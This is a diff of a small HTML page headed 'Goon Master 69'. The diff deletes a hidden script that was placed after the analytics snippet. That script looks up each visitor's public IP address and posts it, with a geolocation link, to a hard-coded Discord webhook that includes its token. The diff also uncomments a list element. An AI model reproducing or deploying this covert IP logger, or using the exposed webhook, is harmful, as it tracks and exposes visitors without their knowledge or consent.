@@ -223,50 +223,11 @@
       ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
       var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
     })();
-
-    function get_information(link, callback) {
-            var xhr = new XMLHttpRequest();
-            xhr.open("GET", link, true);
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4) {
-                    callback(xhr.responseText);
-                }
-            };
-            xhr.send(null);
-        }
-
-        get_information("https://api.ipify.org/", function(text) {
-            var div = document.createElement("div");
-            div.innerHTML = text;
-            div.id = "ipppp";
-            const secondList = document.getElementsByClassName("header")[0];
-            secondList.appendChild(div);
-        });
-
-        function ipLogByRaz() {
-            var ispp = document.getElementById('ipppp').innerHTML;
-            var extra = document.getElementById("razzylog").innerHTML;
-            const request = new XMLHttpRequest();
-            request.open("POST", wbhk);
-            request.setRequestHeader('Content-type', 'application/json');
-            const params = {
-                username: "Bird",
-                avatar_url: 'https://i.postimg.cc/cLbXKSsR/apple.webp',
-                content: "**Ip** : _" + ispp + "_\n**Beamed** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Extra Info** : @here" + "`"
-            };
-            request.send(JSON.stringify(params));
-        }
-
-        setTimeout(function() {
-            ipLogByRaz();
-        }, 700);
-
-        var wbhk = 'https://discord.com/api/webhooks/1333225474167668776/5n6wwfzSSNJWkFc56dtQAJUb40F1wx4eFllagOvfmtX9yt4ShjGTngBVjWFGWWtmBESb' 
   </script>
 </head>
 <body>
   <h1>Goon Master 69</h1>
-  <!-- <ul id="sitelist"> -->
+  <ul id="sitelist">
   </ul>
 </body>
 </html>
